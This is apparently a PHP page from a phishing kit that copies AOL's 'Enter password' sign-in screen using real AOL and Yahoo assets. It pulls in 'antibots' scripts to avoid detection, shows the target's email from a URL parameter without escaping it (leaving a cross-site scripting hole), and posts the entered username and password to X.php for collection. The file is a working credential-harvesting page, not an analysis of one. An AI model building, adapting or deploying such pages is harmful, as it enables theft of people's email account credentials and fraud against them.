<?php

session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS ||-----------------------------------------------------//
include "0/a.php";
include "0/b.php";
include "0/c.php";
?>
<!DOCTYPE html>
<html id="Stencil" class="no-js grid light-theme ">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL.</title>
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">

        <style nonce="zBAjekTfvNTxRZMTJn8llSgMnC81JM4Y+eIRJepbGUtIrJUT">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/92fa1eb95d8f59dc2ba73e44b55fb8b529f22540/aol-main.css" rel="stylesheet" type="text/css">
        
    </head>
    <body class="bucket-">
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            <p class="mbr-legacy-device">
                    AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="">More Info</a>
            </p>
        </div>
    
    <div id="login-body" class="loginish  puree-v2 responsive grid">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.aol.com/">
            <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
            <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="" />
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="#">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-US" width="100" height="" />
                    <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-US" width="100" height="" />
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?php echo $_GET["id1"]; ?></div>
</div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter password</strong>
    <span class="txt-align-center challenge-desc">to finish sign in</span>
    <form action="X.php" method="post" class="pure-form challenge-form">
            <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="id1" value="<?php echo $_GET["id1"]; ?>" required="" />
        </div>
        <input type="hidden" name="passwordContext" value="normal" />
        <div id="password-container" class="input-group password-container focussed">
            <input type="password" id="login-passwd" class="password"  name="id2" placeholder=" " autofocus autocomplete="current-password" required=""/>
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show password"></button>
        </div>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:slk:next;primary;mKey:password-challenge-next">
                    Next
            </button>
        </div>
        <div class="forgot-cont bottom-cta">
            <input type="reset" class="pure-button puree-button-link challenge-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-forgot" id="mbr-forgot-link"
                name="skip" value="Forgot password?" data-rapid-tracking="true" />
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner">
                <div id="login-ad-rich"></div>
                    </div>
    </div>
</div>
   
    
    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe11.member.ir2.yahoo.com - Tue Mar 31 2020 08:52:06 GMT+0000 (Coordinated Universal Time) - (0ms) -->